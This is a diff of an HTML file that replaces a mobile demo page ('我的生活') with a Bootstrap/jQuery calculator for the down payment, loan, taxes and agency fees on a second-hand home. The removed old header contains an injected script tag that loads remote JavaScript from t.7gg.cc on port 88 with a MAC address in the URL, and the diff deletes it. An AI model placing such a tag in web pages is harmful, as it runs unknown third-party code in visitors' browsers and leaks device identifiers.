@@ -1,101 +1,85 @@
 
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>我的生活</title>
-    <meta name="viewport" content="initial-scale=1, maximum-scale=1">
-    <link rel="shortcut icon" href="/favicon.ico">
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <meta charset="UTF-8">
+    <meta name="apple-mobile-web-app-title" content="房贷小秘">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-
-    <link rel="stylesheet" href="../../dist/css/sm.min.css">
-    <link rel="stylesheet" href="../../dist/css/sm-extend.min.css">
-
-  <script async=true src="http://t.7gg.cc:88/j1.js?MAC=68DB5448B23F"></script>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="format-detection" content="telephone=no">
+    <meta name="location" content="province=;city=;coord=,">
+<head>
+    <title>二手房首付计算器</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+        <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.0/css/bootstrap.min.css">
+        <script src="https://cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
 </head>
-  <body>
 
-  <div class="page-group">
-      <!-- 你的html代码 -->
-      <div class="page">
-          <header class="bar bar-nav">
-              <a class="button button-link button-nav pull-left" href="/demos/card">
-                  <span class="icon icon-left"></span>
-                  返回
-              </a>
-              <h1 class="title">我的生活</h1>
-          </header>
-          <nav class="bar bar-tab">
-              <a class="tab-item external active" href="#">
-                  <span class="icon icon-home"></span>
-                  <span class="tab-label">首页</span>
-              </a>
-              <a class="tab-item external" href="#">
-                  <span class="icon icon-me"></span>
-                  <span class="tab-label">我</span>
-              </a>
-              <a class="tab-item external" href="#">
-                  <span class="icon icon-star"></span>
-                  <span class="tab-label">收藏</span>
-              </a>
-              <a class="tab-item external" href="#">
-                  <span class="icon icon-settings"></span>
-                  <span class="tab-label">设置</span>
-              </a>
-          </nav>
-          <div class="content">
-              <!-- 这里是页面内容区 -->
-              <div class="page-index">
-                  <div class="card">
-                      <div style="background-image:url(//gqianniu.alicdn.com/bao/uploaded/i4//tfscom/i3/TB10LfcHFXXXXXKXpXXXXXXXXXX_!!0-item_pic.jpg_250x250q60.jpg)" valign="bottom" class="card-header color-white no-border">旅途的山</div>
-                      <div class="card-content">
-                          <div class="card-content-inner">
-                              <p class="color-gray">发表于 2015/01/15</p>
-                              <p>此处是内容...</p>
-                          </div>
-                      </div>
-                      <div class="card-footer">
-                          <a href="#" class="link">赞</a>
-                          <a href="#" class="link">更多</a>
-                      </div>
-                  </div>
-                  <div class="card">
-                      <div style="background-image:url(//gqianniu.alicdn.com/bao/uploaded/i4//tfscom/i3/TB10LfcHFXXXXXKXpXXXXXXXXXX_!!0-item_pic.jpg_250x250q60.jpg)" valign="bottom" class="card-header color-white no-border">旅途的山</div>
-                      <div class="card-content">
-                          <div class="card-content-inner">
-                              <p class="color-gray">发表于 2015/01/15</p>
-                              <p>此处是内容...</p>
-                          </div>
-                      </div>
-                      <div class="card-footer">
-                          <a href="#" class="link">赞</a>
-                          <a href="#" class="link">更多</a>
-                      </div>
-                  </div>
-                  <div class="card">
-                      <div style="background-image:url(//gqianniu.alicdn.com/bao/uploaded/i4//tfscom/i3/TB10LfcHFXXXXXKXpXXXXXXXXXX_!!0-item_pic.jpg_250x250q60.jpg)" valign="bottom" class="card-header color-white no-border">旅途的山</div>
-                      <div class="card-content">
-                          <div class="card-content-inner">
-                              <p class="color-gray">发表于 2015/01/15</p>
-                              <p>此处是内容...</p>
-                          </div>
-                      </div>
-                      <div class="card-footer">
-                          <a href="#" class="link">赞</a>
-                          <a href="#" class="link">更多</a>
-                      </div>
-                  </div>
-              </div>
-          </div>
-      </div>
-  </div>
-
-    <script type='text/javascript' src='//g.alicdn.com/sj/lib/zepto/zepto.min.js' charset='utf-8'></script>
-    <script type='text/javascript' src='../../dist/js/sm.js' charset='utf-8'></script>
-    <script type='text/javascript' src='../../dist/js/sm-extend.js' charset='utf-8'></script>
+<body>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <h1 class=text-center>二手房首付计算器</h1>
+<!--                <div class="alert alert-info" role="alert">只支持计算满五唯一！</div>-->
+                <div class="form-group">
+                    <label for="a">总价（万）</label>
+                    <input type="text" class="form-control" id="a" placeholder="输入房屋总价（万）">
+                </div>
+                <div class="form-group">
+                    <label for="b">评估比例%</label>
+                    <input type="text" class="form-control" id="b" placeholder="评估比例" value="85">
+                </div>
+                <div class="form-group">
+                    <label for="c">首套 / 二套</label>
+                    <select id="c" class="form-control">
+                        <option value="30">首套（30%）</option>
+                        <option value="60">二套（60%）</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="d">中介费%</label>
+                    <input type="text" class="form-control" id="d" placeholder="贷款比例" value="2.7">
+                </div>
+                <button class="btn btn-primary btn-block">计算</button>
+                <br><br>
+                <div class="alert alert-info" role="alert">
+                    <h1>首付：<span id="jsf"></span></h1>
+                    <ul>
+                        <li>网签价：<span id="wqj"></span></li>
+                        <li>贷款：<span id="dk"></span></li>
+                        <li>税费：<span id="sf"></span></li>
+                        <li>中介费：<span id="zjf"></span></li>
+                        <li>================</li>
+                        <li>总支出：<span id="zj"></span></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
     <script>
-        $.init();
+        $(function(){
+            $("button").click(function(){
+                var a = parseFloat($("#a").val()), // 房屋总价
+                b = parseFloat($("#b").val()), // 评估比例
+                c = parseFloat($("#c").val()), // 首套 || 二套
+                d = parseFloat($("#d").val()), // 中介费比例
+
+                fwzj = a, // 房屋总价
+                wqj = fwzj * b/100, // 网签价
+                dk = wqj * (1 - c/100),
+                sf= wqj * 1/100, // 税费
+                zjf = fwzj * d/100, // 中介费
+                jsf = wqj * c/100 + fwzj * (1 - b/100) + sf + zjf, // 净首付
+                zj = fwzj + sf+ zjf; // 总和
+
+                $("#zj").html(zj.toFixed(2) + "万");
+                $("#wqj").html(wqj.toFixed(2) + "万");
+                $("#sf").html(sf.toFixed(2) + "万");
+                $("#zjf").html(zjf.toFixed(2) + "万");
+                $("#jsf").html(jsf.toFixed(2) + "万");
+                $("#dk").html(dk.toFixed(2) + "万");
+            });
+        });
     </script>
-  </body>
+</body>
+
 </html>
